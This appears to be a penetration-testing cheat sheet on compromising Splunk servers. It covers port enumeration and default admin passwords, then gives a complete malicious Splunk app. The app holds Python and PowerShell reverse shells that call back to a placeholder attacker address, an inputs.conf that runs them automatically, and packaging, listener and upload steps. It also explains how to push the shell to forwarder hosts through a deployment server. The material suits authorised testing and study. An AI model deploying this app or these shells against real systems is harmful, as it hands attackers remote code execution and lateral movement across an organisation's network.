### Content

- [Enumeration](#enumeration)
- [Attacks](#attacks)
	- [RCE](#rce)

> Focus on weak or null authentication. Admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

---
### Enumeration

```bash
# 8000: Web Interface GUI.
# 8089: Management port, CLI commands and the REST API.
nmap -p8000,8089 <IP>

# Check the username "admin" with credentionls like "changeme, admin, Welcome, Welcome1, Password123"
```

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about.

---
### Attacks
#### RCE

Create these files with the same hierarchy 

```bash
$ tree reverse_shell_splunk

reverse_shell_splunk
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
    
$ cat reverse_shell_splunk/bin/rev.py
import sys,socket,os,pty

ip="attacker-ip-here"
port="attacker port here"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

$ cat reverse_shell_splunk/bin/run.bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

$ cat reverse_shell_splunk/bin/run.ps1
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip_here',attacker_port_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$ cat reverse_shell_splunk/default/inputs.conf
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = pentest

[script://.\bin\run.bat]
disabled = 0
sourcetype = pentest
interval = 10
```

If the target is windows, edit the PowerShell script and if it's a Linux host, edit the python file.
Once the files are created, we can create a tarball or `.spl` file.

```bash
tar -cvzf updater.tar.gz reverse_shell_splunk/

# open a reverse shell listener
nc -lvnp 4444
```

Go to `https://<IP>:8000/en-US/manager/search/apps/local` and use the `install app from file` to upload the `updater.tar.gz`, As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

> If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
